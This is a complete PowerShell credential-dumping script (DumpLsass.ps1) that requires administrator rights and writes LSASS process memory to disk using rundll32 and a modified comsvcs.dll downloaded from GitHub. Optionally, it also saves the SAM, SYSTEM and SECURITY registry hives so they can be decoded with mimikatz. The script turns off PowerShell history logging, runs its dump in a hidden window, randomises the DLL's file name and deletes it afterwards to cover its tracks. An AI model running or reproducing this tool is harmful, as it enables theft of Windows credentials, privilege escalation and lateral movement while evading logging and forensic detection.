<#
.SYNOPSIS
   Dump Lsass.exe process memory to retrieve credentials!

   Author: @r00t-3xp10it
   Mitre : T1003 (lolbas)
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Admin privs, rundll32.exe, comsvcs.dll
   Optional Dependencies: cmd, Invoke-WebRequest
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   Adversaries commonly abuse the Local Security Authority Subsystem Service (LSASS)
   to dump credentials for privilege escalation, data theft, and lateral movement. The
   process is a juicy target for adversaries because of the sheer amount of sensitive
   information it stores in memory. Upon startup LSASS contains valuable auth data.

.NOTES
   This cmdlet uses the Windows DLL Host (rundll32.exe) to execute an modified version
   of native DLL comsvcs.dll, which exports a function called MiniDumpW. When this export
   function is called by Rundll32, adversaries can feed in a process ID such as LSASS and
   create a MiniDump file from LSASS process on disk.

.Parameter Action
   Accepts arguments: lsass, all (default: lsass)

.Parameter FileName
   The dump file name to create (default: MiniDump)

.Parameter Storage
   Where to store files\scripts\dumpFile (default: $Env:TMP)

.EXAMPLE
   PS C:\> Get-Help .\DumpLsass.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Action lsass -FileName "DumpSecrets"
   Dump lsass data onto DumpSecrets.bin file

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Action lsass -Storage "$Env:TMP"
   Dump lsass data and all files required on %tmp% directory

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Action all -Storage "$Env:TMP"
   Dump lsass + sam + system files data to %tmp% directory

.INPUTS
   None. You cannot pipe objects into DumpLsass.ps1

.OUTPUTS
   auth token     lsass
   ----------     ----------
   ADMINISTRATOR  Responding 

   * Dumping lsass process memory data.
     => Downloading comsvcs.dll from github
     => Extracting lsass process ppid: '684'
     => Dumping lsass process data to: 'C:\Users\pedro\AppData\Local\Temp\MiniDump.bin'
     => Dumping sam, system, security data to: 'C:\Users\pedro\AppData\Local\Temp'
   * Done - TimeLapse: 22:06:24 - Decode with mimikatz ..
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FileName="MiniDump",
   [string]$Storage="$Env:TMP",
   [string]$Action="lsass"
)


Write-Host "`n"
$ErrorActionPreference = "SilentlyContinue"
$Working_dir = $pwd|Select -ExpandProperty Path
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


#Check cmdlet privileges
If($IsClientAdmin -iMatch 'False')
{
   Write-Host "* Dumping lsass process memory data." -ForegroundColor Green;Start-Sleep -Milliseconds 400
   Write-Host "  => error: Administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "`n";exit #Exit @DumpLsass cmdlet
}
Else
{
   $ProcState = (Get-Process -Name lsass).Responding
   If($ProcState -iMatch 'True'){$PState = "Running"}Else{$PState = "Stopped?"}
   Write-Host "auth token     lsass" -ForegroundColor Green
   Write-Host "----------     -------"
   Write-Host "ADMINISTRATOR  $PState`n";Start-Sleep -Milliseconds 1000
   Write-Host "* Dumping lsass process memory data." -ForegroundColor Green
   Start-Sleep -Milliseconds 400
}

#Check cmdlet requirements.
Write-Host "  => Downloading comsvcs.dll from github"
If(-not(Test-Path -Path "$Storage\comsvcs.dll" -EA SilentlyContinue))
{
   <#
   .SYNOPSIS
      Author: @r0t-3xp10it
      Helper - auto\manual deploy of comsvcs.dll DLL on 'Storage' directory!
   #>
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/comsvcs.dll" -OutFile "$Storage\$RandomMe.dll"|Unblock-File
}
Else
{
   #Used to debug cmdlet!
   $RandomMe = "comsvcs"
}


#Get LSASS process ppid
$DumpPpid = (Get-Process -Name lsass).Id
Write-Host "  => Extracting lsass process ppid: '$DumpPpid'"
If(Test-Path -Path "$Storage\$FileName.bin")
{
   Remove-Item -Path "$Storage\$FileName.bin" -Force
}

cd $Storage
Start-Sleep -Milliseconds 600
try{#Run comsvcs.dll DLL locally {$pwd} on a child process..
   Write-Host "  => Dumping lsass process data to: '$Storage\$FileName.bin'";Start-Sleep -Milliseconds 600
   Start-Process -WindowStyle hidden rundll32.exe -ArgumentList "$RandomMe.dll, MiniDump $DumpPpid $Storage\$FileName.bin full" -Wait
}catch{
   Write-Host "  => error: fail to execute 'rundll32, $RandomMe.dll, MiniDump'" -ForegroundColor Red -BackgroundColor Black
}


If($Action -ieq "all")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump SAM, SYSTEM, SECURITY registry hive(s) data!
   #>

   #Delete old dumps left behind by previous executions.
   If(Test-Path -Path "sam" -EA SilentlyContinue){Remove-Item -Path "$Storage\sam" -Force}
   If(Test-Path -Path "system" -EA SilentlyContinue){Remove-Item -Path "$Storage\system" -Force}
   If(Test-Path -Path "security" -EA SilentlyContinue){Remove-Item -Path "$Storage\security" -Force}

   #Use cmd to dum related files
   cmd /R reg save hklm\sam sam|Out-Null
   cmd /R reg save hklm\system system|Out-Null
   cmd /R reg save hklm\security security|Out-Null
   Write-Host "  => Dumping sam, system, security data to: '$Storage'"

}


cd $Working_dir
Start-Sleep -Milliseconds 600
#Clean all artifacts left behind.
$DoneDate = Get-Date -Format "HH:mm:ss"
Remove-Item -Path "$Storage\$RandomMe.dll" -EA SilentlyContinue -Force
Write-Host "* Done - TimeLapse: $DoneDate - Decode with mim`ikatz ..`n`n" -ForegroundColor Green
exit